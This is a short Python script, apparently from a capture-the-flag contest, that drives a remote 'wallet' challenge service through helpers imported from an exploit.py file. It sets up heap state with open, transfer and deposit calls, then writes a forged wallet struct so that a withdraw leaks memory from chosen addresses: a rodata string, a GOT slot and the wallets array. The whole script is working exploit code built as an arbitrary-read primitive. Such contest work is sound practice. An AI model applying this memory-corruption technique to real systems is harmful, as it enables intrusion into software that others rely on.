import sys, struct, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "exploit.py")
ex = importlib.util.module_from_spec(spec); spec.loader.exec_module(ex)
R, open_wallet, transfer, deposit, fake_struct, U64 = (
    ex.Remote, ex.open_wallet, ex.transfer, ex.deposit, ex.fake_struct, ex.U64)

r = R("chal.sunshinectf.games", 26004)
r.pump(1.5); r.buf = b""
open_wallet(r, b"A", 48); open_wallet(r, b"C", 48); transfer(r, 0, 1); open_wallet(r, b"B", 48)

def probe(addr, n=64, label=""):
    # craft B's struct: ledger=addr, size=n ; then withdraw wallet 2
    r.send(2, b"Deposit into which wallet?"); r.send(1, b"Enter transaction data:")
    r.raw(fake_struct(addr, n) + b"\0" * max(0, 48 - len(fake_struct(addr, n))), b">>>")
    r.send(3, b"Withdraw from which wallet?")
    out = r.send(2)
    r.pump(1.0)
    print(f"\n=== probe {label} from {hex(addr)} (asked {n}) ===")
    print("consumed:", repr(out[:420]))
    print("residue :", repr(r.buf[:200]))
    r.buf = b""

probe(0x402008, 64, "banner rodata string")
probe(0x404000, 64, "GOT free slot")
probe(0x4040c0, 64, "wallets array")
